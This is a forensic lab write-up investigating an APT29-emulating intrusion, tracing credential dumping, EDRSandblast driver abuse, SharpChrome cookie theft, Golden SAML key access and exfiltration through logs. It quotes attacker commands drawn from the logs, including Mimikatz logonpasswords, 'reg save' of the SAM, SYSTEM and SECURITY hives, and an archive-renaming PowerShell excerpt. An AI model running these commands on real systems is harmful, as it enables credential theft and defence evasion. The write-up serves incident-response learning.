<p>This security setting prevents explicit credentials from being sent to the remote computer. Instead, a unique session is created on the remote computer with a temporary set of credentials. This is only valid in the context of the local computer, and ensures that the original credentials remain protected. Microsoft has a <a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard?tabs=intune">table comparing their Remote Desktop security options</a>, where they state that <strong>Restricted Admin mode prevents Pass-the-Hash</strong> attacks ü§îü§î. Well, yes and no.</p>

<p><img src="/spellzedblog/assets/screenshots/figure033.png" alt="figure033"></p>

<p><strong>Figure 33</strong>: A Table Comparing Microsoft RDP Security Features</p>

<blockquote>
  <p>üí≠ Whose Side Are You On?</p>

  <p>Initially, I was confused. Why would an attacker increase the security profile of the organisation they were attempting to compromise? My initial hypothesis was that the attackers activated this in order to protect any credentials used or modified by them from us, the defenders. After completing the lab and reviewing my findings, I did not see evidence of further user creation or credential modification. Rather the attacker continued to use valid accounts to perform their dirty work.</p>
</blockquote>

<p>Restricted Admin mode prevents password authentication but makes the remote workstation default to using hashes instead, which ironically <strong>opens another PtH-type vector</strong>.</p>

<p>Reviewing the evidence, we see the following:</p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">2024/05/25 12:43:01</code>, Restricted Admin mode is enabled.</li>
  <li>
<code class="language-plaintext highlighter-rouge">2024/05/25 12:46:18</code>, Mimikatz is run with the following command lines:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">SearchIndexer.exe  privilege::debug sekurlsa::logonpasswords</code></li>
      <li><code class="language-plaintext highlighter-rouge">.\SearchIndexer.exe  "privilege::debug"</code></li>
    </ul>
  </li>
  <li>
<code class="language-plaintext highlighter-rouge">2024/05/27 21:36:59</code>, chisel is downloaded</li>
  <li>
<code class="language-plaintext highlighter-rouge">2024/05/27 21:50:40</code>, chisel is used to pivot from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> using RDP</li>
</ul>

<p>Our attacker uses Restricted Admin Mode to <strong>facilitate lateral movement</strong>. They are able to use the hashes extracted by Mimikatz to authenticate on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> in a logon type 3 (Network logon over NTLM or Kerberos). They then tunnelled the RDP connection using chisel from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>. <a href="https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode">Blumira has an interesting write-up</a> on this, and they too reference the JetBrains supply-chain compromise by <em>Cosy Bear</em>.</p>

<h2 id="signed-drivers-and-edrsandblast">
<a class="anchor" href="#signed-drivers-and-edrsandblast" aria-hidden="true"><span class="octicon octicon-link"></span></a>Signed Drivers and EDRSandblast</h2>

<p>Let‚Äôs see what other post-exploitation activities the attacker has performed.</p>

<blockquote>
  <p>üí≠ We‚Äôre going to catch a big one.</p>

  <p>When investigating incidents involving hands-on-keyboard activity, a good approach is to check for command line history and process execution.</p>
</blockquote>

<p>After successfully pivoting over RDP to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>, we notice the attacker switching accounts from <code class="language-plaintext highlighter-rouge">lindon.renae</code> to <code class="language-plaintext highlighter-rouge">ttkadmin</code>. One reason for this could be Defense Evasion. The attacker may be attempting to throw off a security/DFIR team. As we will find out later, <code class="language-plaintext highlighter-rouge">ttkadmin</code> actually has more privileges assigned to it but <code class="language-plaintext highlighter-rouge">lindon.renae</code> is a local admin and an RDP-enabled user which makes it possible for the attacker to pivot around the network using RDP.</p>

<p><img src="/spellzedblog/assets/images/figure034.png" alt="figure034"></p>

<p><strong>Figure 34</strong>: ELK logs with a filter for PS 4104 showing the attacker‚Äôs activity on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> and a screenshot of the empty staging directory <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code>.</p>

<p>Referring to Figure 34,</p>

<p><strong>Image 1</strong>:</p>
<ul>
  <li>The attacker changes prompt from <code class="language-plaintext highlighter-rouge">lindon.renae</code> to <code class="language-plaintext highlighter-rouge">ttkadmin</code>
</li>
  <li>One of the first actions by <code class="language-plaintext highlighter-rouge">ttkadmin</code> is to check for the current Defender exclusions. We can expect subsequent payloads to be dropped or run from these directories.</li>
</ul>

<p><strong>Image 2</strong>:</p>
<ul>
  <li>The attacker switches into a recently whitelisted staging directory <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code>
</li>
  <li>
<code class="language-plaintext highlighter-rouge">LockApp.exe</code> is run with the arguments <code class="language-plaintext highlighter-rouge">--internet --kernelmode dump</code>, more on these below.</li>
  <li>
<code class="language-plaintext highlighter-rouge">cmd.exe</code> is retrieved from the same remote location as seen previously in <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>, which makes it possibly the same trojanized version of <code class="language-plaintext highlighter-rouge">cmd.exe</code>
</li>
</ul>

<p><strong>Image 3</strong>:</p>
<ul>
  <li>The directory is left empty by the attacker to cover their tracks.</li>
</ul>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Timestamp</th>
      <th style="text-align: left">Action</th>
      <th style="text-align: left">File Path</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">2024/05/27 22:11:44</code></td>
      <td style="text-align: left">File created</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Windows\Temp\LockApp.exe</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">2024/05/27 22:12:35</code></td>
      <td style="text-align: left">File created</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Windows\Temp\gdrv.sys</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">2024/05/27 22:13:54</code></td>
      <td style="text-align: left">File created</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Windows\Temp\fltMgr.pdb</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">2024/05/27 22:13:54</code></td>
      <td style="text-align: left">File created</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Windows\Temp\ntkrnlmp.pdb</code></td>
    </tr>
  </tbody>
</table>

<p><strong>Figure 35</strong>: Sysmon ID 11 ‚ÄúFile Creation‚Äù events which show the files created around that time period by <code class="language-plaintext highlighter-rouge">ttkadmin</code>.</p>

<p>After the creation of <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\LockApp.exe</code>, <code class="language-plaintext highlighter-rouge">gdrv.sys</code>, <code class="language-plaintext highlighter-rouge">fltMgr.pdb</code> and <code class="language-plaintext highlighter-rouge">ntkrnlmp.pdb</code> were created. The time the two .pdb files were created is the exact time of the execution of <code class="language-plaintext highlighter-rouge">LockApp.exe</code>, which warrants a closer look.</p>

<p><img src="/spellzedblog/assets/images/figure036.png" alt="figure036"></p>

<p><strong>Figure 36</strong>: Events around the execution of <code class="language-plaintext highlighter-rouge">LockApp.exe</code> at the timestamp <code class="language-plaintext highlighter-rouge">2025-05-27 22:13:54</code></p>

<p>The following occurs at the timestamp <code class="language-plaintext highlighter-rouge">2025-05-27 22:13:54</code>:</p>

<p><strong>Image 1</strong>:</p>
<ul>
  <li>Sysmon Event ID 6 events show us that a driver, <code class="language-plaintext highlighter-rouge">gdrv.sys</code> was loaded <a href="https://www.virustotal.com/gui/file/31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427">VirusTotal link to <code class="language-plaintext highlighter-rouge">gdrv.sys</code></a>.</li>
  <li>Note that <code class="language-plaintext highlighter-rouge">gdrv.sys </code>is <a href="https://github.com/wavestone-cdt/EDRSandblast/blob/master/README.md">listed as one of the vulnerable drivers (BYOVD)</a> that <code class="language-plaintext highlighter-rouge">EDRSandblast</code> natively supports.</li>
</ul>

<p><strong>Image 2</strong>:</p>
<ul>
  <li>A service type ‚Äúkernel mode driver‚Äù was installed in the system</li>
</ul>

<p><strong>Image 3</strong>:</p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">LockApp.exe</code> is run with the arguments `‚Äìinternet ‚Äìkernelmode dump</li>
  <li>Immediately after, <code class="language-plaintext highlighter-rouge">Lockapp.exe</code> creates <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\ntkrnlmp.pdb</code> and <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\fltMgr.pdb</code>
</li>
</ul>

<p>From this evidence we can conclude that:</p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">LockApp.exe</code> loaded a vulnerable driver natively supported by EDRSandblast</li>
  <li>
<code class="language-plaintext highlighter-rouge">LockApp.exe</code> created two .pdb files after running with the <code class="language-plaintext highlighter-rouge">internet</code> parameter</li>
</ul>

<p>The .pdb files and a vulnerable driver are requirements for EDRSandblast to function. We won‚Äôt attempt to explain the tool better than the manual, but these strongly indicate that <code class="language-plaintext highlighter-rouge">Lockapp.exe</code> is EDRSandblast.</p>

<blockquote>
  <p>üí≠ EDRSandblast</p>

  <p>Granted, the questions themselves are huge hints, but this is a cool learning opportunity to observe the artefacts captured by the execution of EDRSandblast.
<a href="https://github.com/wavestone-cdt/EDRSandblast"><code class="language-plaintext highlighter-rouge">EDRSandblast</code></a> has been historically used by APT29 to dump the <code class="language-plaintext highlighter-rouge">lsass.exe</code> process from memory and disable EDR solutions.</p>
</blockquote>

<p>The command line indicates that the attacker has managed to <strong>dump the lsass process</strong> while evading the stock EDR tool on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>. We can expect the hashes and kerberos tickets of logged on users and even sessions stored since the last restart and have not been closed to be present in this memory dump. Finally, after running <code class="language-plaintext highlighter-rouge">LockApp.exe</code> (EDRSandblast) the attacker covers their tracks by deleting the associated files.</p>

<p><img src="/spellzedblog/assets/screenshots/figure037.png" alt="figure037"></p>

<p><strong>Figure 37</strong>: Deletion of <code class="language-plaintext highlighter-rouge">LockApp.exe</code> and associated files.</p>

<h2 id="dumping-credentials">
<a class="anchor" href="#dumping-credentials" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dumping Credentials</h2>

<p>Our attacker has been busy dumping the lsass process and covering their tracks on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>. However, within the registry are the SAM, SECURITY and SYSTEM hives. Key among the data they possess are local account hashes (SAM secrets), domain cached credentials (LSA secrets) and the cryptographic keys used to encrypt these two sets of secrets.</p>

<table>
  <thead>
    <tr>
      <th>Timestamp</th>
      <th>Command Executed by <code class="language-plaintext highlighter-rouge">scavo.divya</code>
</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2024/05/27 22:45:09</td>
      <td>reg save HKLM\SAM sam.sa</td>
    </tr>
    <tr>
      <td>2024/05/27 22:45:21</td>
      <td>reg save HKLM\SYSTEM se.sa</td>
    </tr>
    <tr>
      <td>2024/05/27 22:45:35</td>
      <td>reg save HKLM\SECURITY sy.sa</td>
    </tr>
    <tr>
      <td>2024/05/27 22:47:54</td>
      <td>reg save HKLM\SECURITY sy.bak</td>
    </tr>
  </tbody>
</table>

<p><img src="/spellzedblog/assets/screenshots/figure038.png" alt="figure038"></p>

<p><strong>Figure 38</strong>:  PowerShell 4104 events showing the credential <code class="language-plaintext highlighter-rouge">scavo.divya</code> using <code class="language-plaintext highlighter-rouge">reg.exe</code> to dump registry hives.</p>

<p>Our attacker makes another user switch, this time using the credential <code class="language-plaintext highlighter-rouge">scavo.divya</code>, before using <code class="language-plaintext highlighter-rouge">reg.exe</code> to dump the <code class="language-plaintext highlighter-rouge">SYSTEM</code>, <code class="language-plaintext highlighter-rouge">SAM</code> and <code class="language-plaintext highlighter-rouge">SECURITY</code> registry hives to <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\1</code></p>

<p><img src="/spellzedblog/assets/screenshots/figure039.png" alt="figure039"></p>

<p><strong>Figure 39</strong>: PowerShell 4104 events showing the exfiltration of the registry hives by the attacker.</p>

<p>The attacker then uses Powershell to compress the directory <code class="language-plaintext highlighter-rouge">C:\Windows\temp\1\</code>, in which the registry hives were saved to, to a file <code class="language-plaintext highlighter-rouge">C:\Windows\temp\s.zip</code>. In combination with the lsass process dump performed with EDRSandblast, our attacker likely has full access to the accounts on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> as well as <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</p>

<p>We were not able to find the exfiltration of the registry hives from <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>, but it could have been uploaded through the trojanized <code class="language-plaintext highlighter-rouge">cmd.exe</code>.</p>

<p>The remaining questions nudge us towards the one server we haven‚Äôt investigated yet. Let us <em>D-Cend</em> into <strong><code class="language-plaintext highlighter-rouge">TTK-DC-01</code></strong>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure040a.png" alt="figure040a">
<img src="/spellzedblog/assets/screenshots/figure040b.png" alt="figure040b">
<img src="/spellzedblog/assets/screenshots/figure040c.png" alt="figure040c"></p>

<p><strong>Figure 40</strong>: Sysmon ID 1 ‚ÄúProcess Creation‚Äù Events showing activity from <code class="language-plaintext highlighter-rouge">C:\Code\systoolkit\Word.exe</code></p>

<p>Below we see that <code class="language-plaintext highlighter-rouge">cmd.exe</code> runs two <code class="language-plaintext highlighter-rouge">wmic</code> commands to list processes on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong> and <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong> with an interesting parent process <code class="language-plaintext highlighter-rouge">Word.exe</code>. After enumerating currently running processes, there is a long wait before the attacker runs a command to create a directory <code class="language-plaintext highlighter-rouge">C:\Code</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong> and <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong>. Possibly another staging directory.</p>

<h3 id="investigating-wordexe">
<a class="anchor" href="#investigating-wordexe" aria-hidden="true"><span class="octicon octicon-link"></span></a>Investigating word.exe</h3>

<p>While the attacker was using the user <code class="language-plaintext highlighter-rouge">scavo.divya</code> to dump the registry hives on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>, around the same time, the user <code class="language-plaintext highlighter-rouge">lindon.renae</code> signs in to <strong><code class="language-plaintext highlighter-rouge">TTK-DC-01</code></strong> at <code class="language-plaintext highlighter-rouge">2024/05/27 22:46:55</code> from <code class="language-plaintext highlighter-rouge">10.0.3.4</code>. This attacker sure is busy!</p>

<p><img src="/spellzedblog/assets/screenshots/figure041.png" alt="figure041"></p>

<p><strong>Figure 41</strong>: Event logs showing the creation of <code class="language-plaintext highlighter-rouge">C:\Code\systoolkit\Word.exe</code> via PowerShell download at <code class="language-plaintext highlighter-rouge">22:50:56</code>, followed by execution at <code class="language-plaintext highlighter-rouge">22:51:52</code>.</p>

<p>As shown in Figure 41, the rapid execution post-download indicates minimal delay.</p>

<p><img src="/spellzedblog/assets/screenshots/figure042.png" alt="figure042"></p>

<p><strong>Figure 42</strong>: Process Monitor Process Create filter</p>

<p>The attacker left <code class="language-plaintext highlighter-rouge">Word.exe</code> in the folder which allows us to use Procmon to observe the process behaviour. As observed in figure 42, it spawns a child process <code class="language-plaintext highlighter-rouge">conhost.exe</code> indicating it is capable of running commands. Needless to say, not your typical Microsoft Office functionality.</p>

<p><img src="/spellzedblog/assets/screenshots/figure043.png" alt="figure043"></p>

<p><strong>Figure 43</strong>: Sysmon Process Create events with <code class="language-plaintext highlighter-rouge">Word.exe</code> filtered as parent process.</p>

<p>Referencing Figure 43,</p>
<ul>
  <li>We filter for <code class="language-plaintext highlighter-rouge">Word.exe</code> as the parent process and observe <code class="language-plaintext highlighter-rouge">cmd.exe</code> and <code class="language-plaintext highlighter-rouge">Powershell.exe</code> as child (children?) processes</li>
  <li>Using <code class="language-plaintext highlighter-rouge">PowerShell.exe</code>, The attacker performs further Active Directory reconnaissance using adsi searcher</li>
  <li>The attacker also lists the ongoing processes and command lines and creates their preferred staging directory on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong> and <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong>.</li>
  <li>Observe the second-to-last entry: <code class="language-plaintext highlighter-rouge">cmd.exe</code> is copied from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to only  <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong> at <code class="language-plaintext highlighter-rouge">2024/05/30 1:41:28</code>.</li>
</ul>

<p>The next bit of attacker activity comes 8 hours later- a short nap from our bear? After which it‚Äôs rinse and repeat for as they set exclusions on preferred staging/working directories (<code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code>) before executing another executable, <code class="language-plaintext highlighter-rouge">mstrc.exe</code>  with arguments which could point towards credential dumping.</p>

<p><img src="/spellzedblog/assets/screenshots/figure044.png" alt="figure044"></p>

<p><strong>Figure 44</strong>: After copying <code class="language-plaintext highlighter-rouge">cmd.exe</code> and taking a short break, the attacker begins working on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong></p>

<p><img src="/spellzedblog/assets/screenshots/figure045a.png" alt="figure045a"></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Process Create:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2024-05-30 09:36:31.203
ProcessGuid: {ca68c618-489f-6658-4402-000000001000}
ProcessId: 2464
Image: C:\Windows\Temp\mstrc.exe
FileVersion: 1.0.0.0
Description: SharpChrome
Product: SharpChrome
Company: -
OriginalFileName: SharpChrome.exe
CommandLine: C:\Windows\Temp\mstrc.exe  cookies
CurrentDirectory: C:\Windows\Temp\
User: techtonik\scavo.divya
LogonGuid: {ca68c618-2696-6658-50ae-110000000000}
LogonId: 0x11AE50
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=C6DC09CBB9411287F9EF89F737E43AB65A50A90A,MD5=1DBCC831511D77A49B47779966CCDD77,SHA256=D26778AC5F8EBA358588D3ACF07508272A7859B26D358128BCCC7AF7580F2265,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: {ca68c618-489f-6658-4202-000000001000}
ParentProcessId: 1984
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: /c C:\Windows\Temp\mstrc.exe cookies
ParentUser: techtonik\scavo.divya
</code></pre></div></div>
<p><strong>Figure 45</strong>: Two different artefacts: amcache and Sysmon providing information on <code class="language-plaintext highlighter-rouge">mstrc.exe</code>.</p>

<p>We can check the <em>amcache</em> again for more information on <code class="language-plaintext highlighter-rouge">mstrc.exe</code>, which reveals the original name of ‚ÄúSharpChrome‚Äù. Sysmon Process Creation events also record the original .exe name, <a href="https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sharpchrome"><code class="language-plaintext highlighter-rouge">SharpChrome.exe</code></a>. The attacker has obtained browser credentials from <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong>, providing them with access to any saved browser cookies and Logins.</p>

<h2 id="golden-saml">
<a class="anchor" href="#golden-saml" aria-hidden="true"><span class="octicon octicon-link"></span></a>Golden SAML</h2>

<p>Golden SAML is similar to the ‚ÄúGolden Ticket‚Äù of kerberos fame, except instead of forging Ticket Granting Tickets (TGTs) which would grant you access to all services/resources accessible by any users in the domain, the goal is to forge SAML authentication tokens which would allow the attacker to masquerade as any user in the domain.</p>

<p>The Golden SAML requires several components, but a <em>key</em> component is the Distributed Key Manager (DKM) key. Read more about the requirements of this attack in this <a href="https://simulandlabs.com/labs/GoldenSAML/README.html">article from SimuLand</a>.</p>

<p>We investigate <strong><code class="language-plaintext highlighter-rouge">TTK-DC-01</code></strong> as the DKM key is held in a specific AD object on the DC. We are informed that the TechTonik team have set up <a href="https://learn.microsoft.com/en-us/defender-for-identity/deploy/configure-windows-event-collection#configure-domain-object-auditing">audit logging</a>, so we can filter for 4662 events which will contain the specific GUIDs related to this AD object.</p>

<p>The DKM key value is stored in the¬†<code class="language-plaintext highlighter-rouge">ThumbnailPhoto</code>¬†attribute of an AD object in the ADFS DKM container, but we can‚Äôt just search ‚ÄúthumbnailPhoto‚Äù in 4662 events to find the flag. This is because the Windows Security event logs do not translate the thumbnailPhoto GUID to the ‚ÄúthumbnailPhoto‚Äù string by default. Therefore, we can either search for the GUID of the AD contact object that contains the DKM key, or we can search for the GUID of the <code class="language-plaintext highlighter-rouge">ThumbnailPhoto</code>¬†attribute. For a detailed explanation, check out this <a href="https://simulandlabs.com/labs/GoldenSAML/simulation/export-adfs-dkm-key/README.html">entry in SimuLand</a>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure046.png" alt="figure046"></p>

<p><strong>Figure 46</strong>: A Windows Security 4662 event showing that the DKM key was accessed by <code class="language-plaintext highlighter-rouge">aadcsvc$</code>.</p>

<p>In Figure 46 above, the object name is the GUID of the DKM key. We find evidence of DKM key access by pivoting on the thumbnailPhoto Attribute GUID: <code class="language-plaintext highlighter-rouge">8d3bca50-1d7e-11d0-a081-00aa006c33ed</code>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure047a.png" alt="figure047a">
<img src="/spellzedblog/assets/screenshots/figure047b.png" alt="figure047b"></p>

<p><strong>Figure 47</strong>: PowerShell Script block logs shortly before the DKM key was accessed</p>

<p>With this timestamp, we can search for surrounding events. Mere seconds earlier, we see the execution of a PowerShell script <code class="language-plaintext highlighter-rouge">Get-DKMKey</code>. This script is sufficient to retrieve the DKM key which can be used to forge the ‚ÄúGolden SAML‚Äù token offline.</p>

<h2 id="getting-the-goods-out">
<a class="anchor" href="#getting-the-goods-out" aria-hidden="true"><span class="octicon octicon-link"></span></a>Getting the Goods Out</h2>

<p>There are many ways to uncover the data exfiltration performed by the actor. The most straightforward way is encountered way back at the beginning of the lab, where you are sure to run into the innocuously-named üòá <code class="language-plaintext highlighter-rouge">DocsBackup.rar</code> in the <code class="language-plaintext highlighter-rouge">C:\Temp</code> folder on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>. You could then pivot on this to find the trail of evidence that leads you to <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong> quite easily.</p>

<blockquote>
  <p>üí≠ What if The Attacker Performed Anti-Forensics and Deleted <code class="language-plaintext highlighter-rouge">DocsBackup.rar</code>?</p>

  <p>How would you then find evidence of data exfiltration? This topic is relevant to legal and data protection teams who, in a real compromise, will surely be following your investigation. Read on!</p>
</blockquote>

<p><img src="/spellzedblog/assets/screenshots/figure048.png" alt="figure048"></p>

<p><strong>Figure 48</strong>: This table shows the Windows Security 5145 ‚ÄúDetailed File Share accessed‚Äù events for the <code class="language-plaintext highlighter-rouge">systoolkit</code> staging directory between <code class="language-plaintext highlighter-rouge">2024/05/30 00:00:00</code>  and <code class="language-plaintext highlighter-rouge">2024/05/31 23:59:59</code>. Column 1 shows the files accessed, while columns 2, 3 and 4 show the count of the accounts that accessed these files.</p>

<p>Figure 48 shows that the tools used by the attacker: <code class="language-plaintext highlighter-rouge">chisel</code>, <code class="language-plaintext highlighter-rouge">mimikatz</code>, trojanized <code class="language-plaintext highlighter-rouge">cmd.exe</code>,  and more were accessed repeatedly from the staging directory on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> over these two dates on workstations <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong>, <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong> which had IPs <code class="language-plaintext highlighter-rouge">10.0.3.4</code> and <code class="language-plaintext highlighter-rouge">10.0.3.5</code>. As we already saw, the attacker used these tools to perform Defence Evasion and Lateral Movement throughout the TechTonik network.</p>

<p><img src="/spellzedblog/assets/screenshots/figure049.png" alt="figure049"></p>

<p><strong>Figure 49</strong>: The corresponding activities matching the events in Figure 47 showing three clear spikes of activity from the staging directories on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</p>

<p>Figure 49 above clearly visualises and delineates attacker activity clearly over the final two days. We investigate each spike:</p>

<h3 id="activity-spike-1">
<a class="anchor" href="#activity-spike-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Activity Spike 1:</h3>
<p><img src="/spellzedblog/assets/screenshots/figure050.png" alt="figure050"></p>

<p><strong>Figure 50</strong>: Windows Process Execution logs observing low levels of activity corresponding to the first spike of activity.</p>

<p>The first spike of activity around <code class="language-plaintext highlighter-rouge">2024/05/30 01:10:00</code> that occurs on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong> appears to be nothing significant, the attacker might have been testing access over the network</p>

<h3 id="activity-spike-2">
<a class="anchor" href="#activity-spike-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Activity Spike 2:</h3>
<p>We have already identified the second spike of activity at <code class="language-plaintext highlighter-rouge">2024/05/30 09:19:00</code> , which is the <code class="language-plaintext highlighter-rouge">Sharpchrome.exe</code> activity performed on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-02</code></strong>.</p>

<h3 id="activity-spike-3">
<a class="anchor" href="#activity-spike-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Activity Spike 3:</h3>

<p>The Third and final spike of activity was performed at <code class="language-plaintext highlighter-rouge">2024/05/31 11:19:00</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong>, and is likely data exfiltration in action. The attacker embodies the self-sufficient living-off-the-land spirit and uses a backup script from the TechTonik team to back up files to <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\</code> on each device, before copying them all to <code class="language-plaintext highlighter-rouge">\\TTK-FS-01\Code</code>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure051a.png" alt="figure051a">
<img src="/spellzedblog/assets/screenshots/figure051b.png" alt="figure051b"></p>

<p><strong>Figure 51</strong>: The script <code class="language-plaintext highlighter-rouge">\\TTK-FS-01\Code\adtoolkit\BackupScript.ps1</code> is run to back up files to <code class="language-plaintext highlighter-rouge">C:\Windows\Temp\</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-PC-01</code></strong> before copying them all to <code class="language-plaintext highlighter-rouge">\\TTK-FS-01\Code</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span><span class="w">
</span><span class="c"># Rename the archive file to .bmp</span><span class="w">
</span><span class="nv">$bmpFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.Path</span><span class="p">]::</span><span class="n">ChangeExtension</span><span class="p">(</span><span class="nv">$archiveFile</span><span class="p">,</span><span class="w"> </span><span class="s2">".bmp"</span><span class="p">)</span><span class="w">
</span><span class="n">Rename-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"</span><span class="nv">$archivePath</span><span class="s2">\</span><span class="nv">$archiveFile</span><span class="s2">"</span><span class="w"> </span><span class="nt">-NewName</span><span class="w"> </span><span class="nv">$bmpFile</span><span class="w">
</span><span class="o">...</span><span class="w">
</span></code></pre></div></div>
<p><strong>Figure 52</strong>: Excerpt from <code class="language-plaintext highlighter-rouge">\\TTK-FS-01\Code\adtoolkit\BackupScript.ps1</code></p>

<p>Interestingly enough, the script <code class="language-plaintext highlighter-rouge">BackupScript.ps1</code> has a section to convert the file extension to a <code class="language-plaintext highlighter-rouge">.bmp</code> format, perhaps to emulate <em>APT29</em> more closely (check out that CISA advisory), but judging by the file name and contents of <code class="language-plaintext highlighter-rouge">DocsBackup.rar</code> it seems like this malfunctioned or wasn‚Äôt used.</p>

<p><img src="/spellzedblog/assets/images/figure053.png" alt="figure053"></p>

<p><strong>Figure 53</strong>: Windows Security 5145 ‚ÄúDetailed File Share accessed‚Äù event logs on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> showing access after the script <code class="language-plaintext highlighter-rouge">BackupScript.ps1</code> is run, <code class="language-plaintext highlighter-rouge">bash_history</code> from user <code class="language-plaintext highlighter-rouge">teamcity</code> and the contents of the exfiltrated archive file.</p>

<p><strong>Image 1</strong>:</p>
<ul>
  <li>The last 5145 event shows that <code class="language-plaintext highlighter-rouge">C:\Code</code> was last accessed from <code class="language-plaintext highlighter-rouge">10.0.1.5</code> which is <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>.</li>
  <li>These logs do not show up on the ELK instance.</li>
</ul>

<p><strong>Image 2</strong>:</p>
<ul>
  <li>Evidence of command execution in the <code class="language-plaintext highlighter-rouge">bash_history</code> file for the <code class="language-plaintext highlighter-rouge">teamcity</code> user shows that the archive was moved to <code class="language-plaintext highlighter-rouge">/tmp/</code>.</li>
</ul>

<p><strong>Image 3</strong>:</p>
<ul>
  <li>unpacking <code class="language-plaintext highlighter-rouge">DocsBackup.rar</code> shows the contents of the files.</li>
  <li>The file signatures do not appear to be bitmaps nor do they have the .bmp file extension.</li>
  <li>They have the PK file signature indicating they are xlsx/docx files.</li>
</ul>

<p>The lab hints that the files were exfiltrated from <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>, as they were moved to the <code class="language-plaintext highlighter-rouge">/tmp/</code> directory at <code class="language-plaintext highlighter-rouge">2024/05/31 11:49:29</code>.</p>

